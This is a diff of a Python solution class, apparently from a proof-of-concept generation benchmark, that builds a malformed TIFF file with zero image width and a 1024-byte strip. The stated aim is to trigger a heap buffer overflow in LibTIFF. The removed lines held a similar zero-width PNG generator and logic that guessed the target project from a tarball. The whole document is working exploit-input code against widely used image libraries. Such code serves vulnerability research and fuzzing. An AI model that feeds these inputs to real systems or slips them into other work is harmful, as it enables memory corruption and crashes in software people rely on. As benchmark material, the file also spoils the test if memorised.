@@ -1,103 +1,59 @@
 import struct
-import tarfile
-import zlib
-import io
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability.
-        
-        Args:
-            src_path: Path to the vulnerable source code tarball
-            
-        Returns:
-            bytes: The PoC input that should trigger the vulnerability
+        Generate a PoC that triggers the Heap Buffer Overflow in the target library (LibTIFF).
+        The vulnerability is related to zero width or height images not being checked, 
+        leading to a 0-byte allocation followed by a write based on StripByteCounts.
         """
-        # Identify the target project to generate the correct file format
-        project = "libtiff" # Default to LibTIFF as it's a common target for this vulnerability
+        # Build a TIFF file
+        # Byte order: Little Endian
+        header = b'II\x2a\x00\x08\x00\x00\x00'
         
-        try:
-            with tarfile.open(src_path, 'r') as tar:
-                for member in tar.getnames():
-                    name = member.lower()
-                    if "libtiff" in name or "tiff-" in name:
-                        project = "libtiff"
-                        break
-                    if "libspng" in name or ("png" in name and "lib" in name):
-                        project = "libspng"
-                        break
-                    if "tinygltf" in name:
-                        project = "tinygltf"
-                        break
-                    if "openjpeg" in name:
-                        project = "openjpeg"
-                        break
-        except Exception:
-            pass
-
-        if project == "libspng":
-            return self.generate_png_poc()
-        elif project == "tinygltf":
-            # TinyGLTF vulnerability typically triggered by loading malicious image assets
-            return self.generate_png_poc()
-        else:
-            return self.generate_tiff_poc()
-
-    def generate_tiff_poc(self) -> bytes:
-        # Generate a TIFF file with ImageWidth=0 to trigger Heap Buffer Overflow
-        # Vulnerability: width=0 -> calculated buffer size=0 -> malloc(0) -> valid ptr
-        # Then read StripByteCounts bytes into the buffer -> Overflow
+        # Tags needed to pass basic validation and reach the vulnerable code
+        # We set ImageWidth to 0 to trigger the 0-allocation.
+        # We provide a large StripByteCounts and data to trigger the overflow during read.
         
-        # TIFF Header: Little Endian
-        header = struct.pack('<2sHI', b'II', 42, 8)
-        
-        # Tags to be included in IFD
-        # Must be sorted by Tag ID
+        # Tag entries: (Tag, Type, Count, Value)
+        # Type 3=SHORT (2 bytes), 4=LONG (4 bytes)
         entries = [
-            (256, 3, 1, 0),      # ImageWidth: 0 (The trigger)
-            (257, 3, 1, 1),      # ImageLength: 1
-            (258, 3, 1, 8),      # BitsPerSample: 8
-            (259, 3, 1, 1),      # Compression: 1 (None)
-            (262, 3, 1, 1),      # PhotometricInterpretation: 1 (BlackIsZero)
-            (273, 4, 1, 122),    # StripOffsets: Offset to data (Header 8 + IFD (2+108+4) = 122)
-            (277, 3, 1, 1),      # SamplesPerPixel: 1
-            (278, 3, 1, 1),      # RowsPerStrip: 1
-            (279, 4, 1, 2048)    # StripByteCounts: 2048 (Large enough to overflow small allocation)
+            (256, 4, 1, 0),       # ImageWidth = 0 (Vulnerability trigger)
+            (257, 4, 1, 10),      # ImageLength = 10
+            (258, 3, 1, 8),       # BitsPerSample = 8
+            (259, 3, 1, 1),       # Compression = 1 (None)
+            (262, 3, 1, 1),       # PhotometricInterpretation = 1 (MinIsBlack)
+            (273, 4, 1, 200),     # StripOffsets = 200 (Pointer to data)
+            (277, 3, 1, 1),       # SamplesPerPixel = 1
+            (278, 4, 1, 10),      # RowsPerStrip = 10
+            (279, 4, 1, 1024),    # StripByteCounts = 1024 (Data to write to buffer)
         ]
         
-        ifd_entries = b''
+        # Sort entries by Tag ID
+        entries.sort(key=lambda x: x[0])
+        
+        # Construct IFD
+        # Number of entries (2 bytes)
+        ifd = struct.pack('<H', len(entries))
+        
         for tag, type_, count, val in entries:
-            # Tag Struct: Tag(2), Type(2), Count(4), Value/Offset(4)
-            ifd_entries += struct.pack('<HHII', tag, type_, count, val)
+            # Entry structure: Tag(2), Type(2), Count(4), Value/Offset(4)
+            ifd += struct.pack('<HHII', tag, type_, count, val)
             
-        num_entries = struct.pack('<H', len(entries))
-        next_ifd = struct.pack('<I', 0)
+        # Next IFD Offset (4 bytes)
+        ifd += struct.pack('<I', 0)
         
-        # Payload data to be read into the buffer
-        payload = b'A' * 2048
+        # Combine Header and IFD
+        data = bytearray(header + ifd)
         
-        return header + num_entries + ifd_entries + next_ifd + payload
-
-    def generate_png_poc(self) -> bytes:
-        # Generate a PNG with Width=0
-        sig = b'\x89PNG\r\n\x1a\n'
+        # Pad with zeros up to StripOffsets (200)
+        if len(data) < 200:
+            data += b'\x00' * (200 - len(data))
+            
+        # Append Payload Data
+        # 1024 bytes of junk data. 
+        # Logic: Buffer allocated for (Width*Height) = 0 bytes.
+        # Read function reads StripByteCounts (1024) bytes into that buffer -> Heap Overflow.
+        data += b'\x41' * 1024
         
-        # IHDR: Width=0, Height=1
-        ihdr_data = struct.pack('>IIBBBBB', 0, 1, 8, 2, 0, 0, 0)
-        ihdr = self.make_chunk(b'IHDR', ihdr_data)
-        
-        # IDAT: Compressed data to trigger processing
-        raw_data = b'\x00' * 1024
-        compressed = zlib.compress(raw_data)
-        idat = self.make_chunk(b'IDAT', compressed)
-        
-        # IEND
-        iend = self.make_chunk(b'IEND', b'')
-        
-        return sig + ihdr + idat + iend
-
-    def make_chunk(self, type_tag, data):
-        length = len(data)
-        crc = zlib.crc32(type_tag + data) & 0xffffffff
-        return struct.pack('>I', length) + type_tag + data + struct.pack('>I', crc)
+        return bytes(data)
